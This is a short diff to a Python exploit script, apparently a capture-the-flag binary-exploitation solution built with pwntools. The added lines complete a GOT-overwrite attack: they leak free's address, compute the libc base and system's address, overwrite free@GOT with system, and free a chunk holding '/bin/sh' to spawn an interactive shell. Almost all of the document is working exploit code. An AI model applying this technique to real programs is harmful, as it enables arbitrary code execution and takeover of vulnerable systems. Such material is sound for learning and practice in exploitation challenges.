@@ -91,7 +91,7 @@ if __name__ == "__main__":
     # *g_player_tbl[a1] = GOT of free
     #
 
-    add(24, 'AAAA', 4, 'BBBB')
+    add(24, '/bin/sh', 8, '/bin/sh\x00')
     add(24, 'CCCC', 4, 'DDDD')
     add(24, 'EEEE', 4, 'FFFF')
     raw_input('after adding 3 items...')
@@ -107,7 +107,17 @@ if __name__ == "__main__":
     print hex_dump(l)
     l = l[0:4]
     l = u32(l)
-    log.info('GOT of free: 0x%x' % l)
+    log.info('free@GOT: 0x%x' % l)
     
     libc_base = l - libc.symbols['free']
     log.info('libc: 0x%x' % libc_base)
+    system_addr = libc_base + libc.symbols['system']
+
+    update(2, 4, p32(system_addr))
+
+    raw_input('after overwriting free@GOT...')
+
+    delete(0)
+    
+    r.interactive()
+
